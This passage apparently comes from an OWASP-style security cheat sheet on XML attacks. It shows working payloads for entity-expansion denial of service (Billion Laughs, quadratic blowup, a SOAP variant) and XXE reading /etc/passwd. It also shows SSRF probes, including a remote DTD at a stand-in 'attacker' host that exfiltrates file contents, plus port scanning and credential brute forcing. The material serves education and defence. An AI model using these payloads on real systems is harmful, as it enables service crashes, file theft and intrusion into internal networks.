<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!DOCTYPE A [</span>
<span class="cp"> &lt;!ELEMENT A ANY&gt;</span>
 <span class="cp">&lt;!ENTITY A &quot;&lt;A&gt;</span><span class="ni">&amp;B;</span><span class="nt">&lt;/A&gt;</span>&quot;&gt;
 <span class="cp">&lt;!ENTITY B &quot;&amp;A;&quot;&gt;</span>
]&gt;
<span class="nt">&lt;A&gt;</span><span class="ni">&amp;A;</span><span class="nt">&lt;/A&gt;</span>
</code></pre></div>

<h4 id="quadratic-blowup">Quadratic Blowup<a class="headerlink" href="#quadratic-blowup" title="Permanent link">&para;</a></h4>
<p>Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion <code>(O(n2))</code>.</p>
<p>The result of the following attack will be 100,000 x 100,000 characters in memory.</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ELEMENT root ANY&gt;</span>
 <span class="cp">&lt;!ENTITY A &quot;AAAAA...(a 100.000 A&#39;s)...AAAAA&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;</span>...(a 100.000 <span class="ni">&amp;A;</span>&#39;s)...<span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;&amp;A;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>

<h4 id="billion-laughs">Billion Laughs<a class="headerlink" href="#billion-laughs" title="Permanent link">&para;</a></h4>
<p>When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes. This is an example XML document with an embedded <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schema including the attack:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ELEMENT root ANY&gt;</span>
 <span class="cp">&lt;!ENTITY LOL &quot;LOL&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;LOL9;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>

<p>The entity <code>LOL9</code> will be resolved as the 10 entities defined in <code>LOL8</code>; then each of these entities will be resolved in <code>LOL7</code> and so on. Finally, the CPU and/or memory will be affected by parsing the <code>3 x 10^9</code> (3,000,000,000) entities defined in this schema, which could make the parser crash.</p>
<p>The Simple Object Access Protocol (<a href="https://en.wikipedia.org/wiki/SOAP">SOAP</a>) specification forbids <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>s completely. This means that a SOAP processor can reject any SOAP message that contains a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. Despite this specification, certain SOAP implementations did parse <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schemas within SOAP messages.</p>
<p>The following example illustrates a case where the parser is not following the specification, enabling a reference to a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> in a SOAP message:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?XML VERSION=&quot;1.0&quot; ENCODING=&quot;UTF-8&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE SOAP-ENV:ENVELOPE [</span>
<span class="cp"> &lt;!ELEMENT SOAP-ENV:ENVELOPE ANY&gt;</span>
 <span class="cp">&lt;!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED&gt;</span>
 <span class="cp">&lt;!ENTITY LOL &quot;LOL&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;</span>
]&gt;
<span class="nt">&lt;SOAP:ENVELOPE</span> <span class="na">ENTITYREFERENCE=</span><span class="s">&quot;&amp;LOL9;&quot;</span>
               <span class="na">XMLNS:SOAP=</span><span class="s">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;SOAP:BODY&gt;</span>
  <span class="nt">&lt;KEYWORD</span> <span class="na">XMLNS=</span><span class="s">&quot;URN:PARASOFT:WS:STORE&quot;</span><span class="nt">&gt;</span>FOO<span class="nt">&lt;/KEYWORD&gt;</span>
 <span class="nt">&lt;/SOAP:BODY&gt;</span>
<span class="nt">&lt;/SOAP:ENVELOPE&gt;</span>
</code></pre></div>

<h4 id="reflected-file-retrieval">Reflected File Retrieval<a class="headerlink" href="#reflected-file-retrieval" title="Permanent link">&para;</a></h4>
<p>Consider the following example code of an XXE:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ELEMENT includeme ANY&gt;</span>
 <span class="cp">&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>

<p>The previous XML defines an entity named <code>xxe</code>, which is in fact the contents of <code>/etc/passwd</code>, which will be expanded within the <code>includeme</code> tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.</p>
<h4 id="server-side-request-forgery">Server Side Request Forgery<a class="headerlink" href="#server-side-request-forgery" title="Permanent link">&para;</a></h4>
<p>Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file, a file via HTTP/HTTPS/FTP, etc. SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.</p>
<h5 id="external-dns-resolution">External DNS Resolution<a class="headerlink" href="#external-dns-resolution" title="Permanent link">&para;</a></h5>
<p>Sometimes is possible to induce the application to perform server-side DNS lookups of arbitrary domain names. This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!DOCTYPE m PUBLIC &quot;-//B/A/EN&quot; &quot;http://checkforthisspecificdomain.example.com&quot;&gt;</span>
</code></pre></div>

<h5 id="external-connection">External Connection<a class="headerlink" href="#external-connection" title="Permanent link">&para;</a></h5>
<p>Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ENTITY % xxe SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;</span>
 %xxe;
]&gt;
</code></pre></div>

<h5 id="file-retrieval-with-parameter-entities">File Retrieval with Parameter Entities<a class="headerlink" href="#file-retrieval-with-parameter-entities" title="Permanent link">&para;</a></h5>
<p>Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;</span>
 %dtd;
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>

<p>Here the <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> defines two external parameter entities: <code>file</code> loads a local file, and <code>dtd</code> which loads a remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. The remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> should contain something like this:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="cp">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://example.com/?%file;&#39;&gt;</span>&quot;&gt;
%all;
</code></pre></div>

<p>The second <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> causes the system to send the contents of the <code>file</code> back to the attacker's server as a parameter of the URL.</p>
<h5 id="port-scanning">Port Scanning<a class="headerlink" href="#port-scanning" title="Permanent link">&para;</a></h5>
<p>The amount and type of information will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:</p>
<p><strong>1) Complete Disclosure</strong>: The simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.</p>
<p><strong>2) Error-based</strong>: If you are unable to see the response from the remote server, you may be able to use the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection:</p>
<div class="codehilite"><pre><span></span><code>java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
</code></pre></div>

<p><strong>3) Timeout-based</strong>: Timeouts could occur when connecting to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.</p>
<p><strong>4) Time-based</strong>: Sometimes differences between closed and open ports are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host; then analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish when performed in higher latency networks.</p>
<h5 id="brute-forcing">Brute Forcing<a class="headerlink" href="#brute-forcing" title="Permanent link">&para;</a></h5>
<p>Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the <code>username</code> and <code>password</code> as part of the URI scheme (http, ftp, etc). For example the following :</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ENTITY user SYSTEM &quot;http://username:password@example.com:8080&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;user;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
        
          <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
            </div>
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                XML External Entity Prevention
              </div>
            </div>
          </a>
        
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright 2020 - CheatSheets Series Team
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/vendor.93c04032.min.js"></script>
      <script src="../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "..",
          features: [],
          search: Object.assign({
            worker: "../assets/javascripts/worker/search.8c7e0a7e.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
    
  </body>
</html>